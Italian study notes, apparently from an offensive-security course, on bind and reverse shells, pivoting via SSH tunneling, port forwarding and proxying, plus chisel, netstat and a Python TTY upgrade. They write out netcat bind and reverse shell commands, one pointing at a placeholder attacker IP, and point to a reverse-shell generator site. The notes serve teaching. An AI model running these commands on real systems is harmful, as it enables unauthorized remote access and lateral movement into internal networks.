#### Vari modi per collegarsi alle shell
- **remote shell**
    - permette di eseguire comandi su una macchina remota
    - tutto ciò che scrivo viene eseguito sul sistema target (non sulla mia macchina)
    - comunicazione tipicamente tramite rete (socket TCP)
- **invio exploit tramite pacchetti**
    - invece di avere una shell interattiva, invio singoli comandi sotto forma di exploit
    - ogni operazione richiede un nuovo invio
- **problema**
    - questo approccio è estremamente tedioso
    - non è pratico se devo eseguire molti comandi
- **assunzioni**
    - ho la possibilità di fare **Remote Code Execution (RCE)**
    - posso far eseguire comandi semplici sulla macchina target
- **conseguenza**
    - eseguire ogni comando singolarmente non è efficiente
    - → serve una **shell interattiva** per lavorare in modo comodo e continuo
##### diverse tipologie di shell remote
###### bind shell
- faccio aprire al server una shell su una certa porta
- il server crea un processo in ascolto su quella porta
- il client (attaccante) si connette a quella porta e ottiene una shell remota
- **comandi (netcat)**
    - lato **server (target)**:
        `nc -lvp 4444 -e /bin/bash`
        - `-l` → listen
        - `-v` → verbose
        - `-p` → porta
        - `-e` → esegue la shell
    - lato **attaccante (client)**:
        `nc <IP_target> 4444`
 - **problema**
    - firewall blocca connessioni in ingresso → spesso non funziona
###### reverse shell
- mi metto in ascolto su una porta
- il server si connette a me
- uso RCE per far partire la connessione dal target
- **comandi (netcat)**
     - lato **attaccante (listener)**:
          `nc -lvp 4444`
    - lato **target**:
        `nc <IP_attaccante> 4444 -e /bin/bash`
- **vantaggi**
    - bypass firewall (connessione in uscita)
    - più realistica
- **come creare una shell**
    - `netcat`
    - vari linguaggi come`bash / python / php` 
    - [https://revshells.com](https://revshells.com) (genera i comandi già pronti)
###### pivoting  
- Il **pivoting** è una tecnica che consiste nell’utilizzare una macchina compromessa come **punto intermedio (ponte)** per accedere ad altre macchine o servizi che non sono direttamente raggiungibili.  
- io attaccante riesco a entrare in una macchina  
- quella macchina ha accesso a una rete interna  
- sfrutto questa macchina per muovermi dentro la rete  
![[Pasted image 20260418090601.png]]  
- Il pivoting si basa su **3 tecniche principali**:  
1. **Tunneling**  
2. **Port Forwarding**  
3. **Proxying**  
- **Tunneling**  
	- consiste nell’incapsulare il traffico all’interno di un altro protocollo (tipicamente SSH)  
	- crea un **canale sicuro (tunnel)** tra due macchine  
	- tutto il traffico passa dentro questo tunnel in modo cifrato  
	- il traffico entra nel tunnel  
	- attraversa la rete  
	- esce dall’altra parte  
	- mi è utile perché:  
		- permette di **bypassare firewall e NAT**  
		- protegge il traffico (cifratura)  
		- consente di raggiungere servizi non direttamente accessibili  
	- il tunneling è il **mezzo (il canale)**  
	- da solo non decide dove va il traffico  
- **Port forwarding**  
	- consiste nel reindirizzare il traffico da una porta a un’altra  
	- viene spesso usato insieme al tunneling (es. SSH)  
	- si divide in 2 tipologie:  
		- Locale  
		- Remoto  
	- **Local Port forwarding**  
		- apro una porta sul **mio PC**
		- il traffico viene inviato dentro un **tunnel SSH** verso la macchina compromessa  
		- la macchina compromessa inoltra il traffico al **target interno**  
		- mi è utile perché mi consente di interagire con una macchina nella rete interna passando attraverso una macchina compromessa  
		- in particolare, posso accedere a servizi non direttamente raggiungibili, facendo sembrare che io stia comunicando con una porta locale (ad esempio `localhost`), mentre in realtà il traffico viene inoltrato a un’altra macchina nella rete interna  
		- il traffico che arriva al target è **traffico normale (es. HTTP)**, non SSH  
		- `ssh user@192.168.0.45 -L 8080:192.168.0.35:80`  
			- mi collego alla macchina compromessa `192.168.0.45`  
			- apro la porta `8080` sul mio PC  
			- quando accedo a `localhost:8080`  
			- sto in realtà comunicando con `192.168.0.35:80`  
	- ![[Pasted image 20260418093518.png]]
	- **Remote Port forwarding**  
		- apro una porta sulla **macchina remota (non sul mio PC)**  
		- il traffico viene inviato attraverso un **tunnel SSH verso di me**  
		- tutto ciò che arriva alla macchina remota viene inoltrato al mio host locale  
		- mi è utile quando:  
		- la macchina target non è direttamente raggiungibile  
		- oppure si trova dietro NAT/firewall  
		- ma può connettersi a me  
		- in questo caso è la macchina remota che “espone” un servizio per conto mio  
		- `ssh user@192.168.0.45 -R 8080:localhost:4444`  
			- mi collego alla macchina `192.168.0.45`  
			- apro la porta `8080` sulla macchina remota  
			- quando qualcuno si connette a `192.168.0.45:8080`  
			- il traffico viene inoltrato al mio PC su `localhost:4444`
		- ![[Pasted image 20260418093532.png]]
	- **Proxying**  
		- consiste nell’utilizzare la macchina compromessa come **proxy**  
		- la macchina compromessa invia le richieste al posto mio e mi restituisce le risposte  
		- in pratica:  
			- io invio una richiesta alla macchina compromessa  
			- la macchina la inoltra al target  
			- riceve la risposta  
			- la rimanda a me  
		- posso interagire con macchine interne senza essere direttamente connesso  
		- posso nascondere la mia origine  
		- posso usare tool attraverso la macchina compromessa  
		- Ad esempio SOCKS proxy (es. tramite SSH `-D` o tool come chisel)
- 
######  ALTRI TOOL (pivoting / analisi rete)
- **chisel**
    - tool per fare **tunneling TCP (anche su HTTP)**
    - utile in scenari di pivoting in ambienti restrittivi
    - supporta:
        - port forwarding (local e remote)
        - SOCKS proxy
    - funziona con modello **client-server**
    - utile quando SSH non è disponibile
- **netstat**
    - è un tool di **analisi delle connessioni di rete**
    - permette di vedere:
        - connessioni attive
        - porte in ascolto
        - processi associati
    - utile perché:
        - capisco quali porte sono aperte
        - individuo servizi attivi
        - aiuta in fase di **enumerazione o privilege escalation**
    - comando:
        `netstat -tulpn`
	    - `-t` → TCP
	    - `-u` → UDP
	    - `-l` → listening
	    - `-p` → processi
	    - `-n` → IP numerici
comando python per aprire shell carina

`python3 -c 'import pty; pty.spawn("/bin/bash")'`
